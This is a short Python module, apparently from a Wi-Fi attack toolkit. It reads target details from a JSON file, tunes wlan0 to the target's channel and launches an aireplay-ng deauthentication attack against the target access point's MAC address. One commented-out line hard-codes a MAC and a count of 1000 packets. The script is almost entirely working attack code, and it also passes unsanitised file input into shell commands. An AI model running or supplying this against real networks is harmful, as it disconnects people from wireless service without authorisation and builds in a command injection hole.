import os
import subprocess

# Capture Target Information
module_input_file_path = os.path.dirname(__file__) + "/../modules/module_input_data.json"
target_information = None

with open(module_input_file_path, "r") as f:
    target_information = f.readlines()
    
##################
## START MODULE ##
##################

#os.system(f"sudo iwconfig wlan0 channel {target_information[4]}")
subprocess.call(f"sudo iwconfig wlan0 channel {target_information[4]}",shell=True)

#os.system("sudo aireplay-ng -0 1000 -a 34:D2:62:F1:77:56 wlan0")
subprocess.call(f"sudo aireplay-ng -0 15 -a {target_information[2].strip()} wlan0", shell=True)
#os.system(f"sudo aireplay-ng -0 {10000} -a {target_information[2]} wlan0")
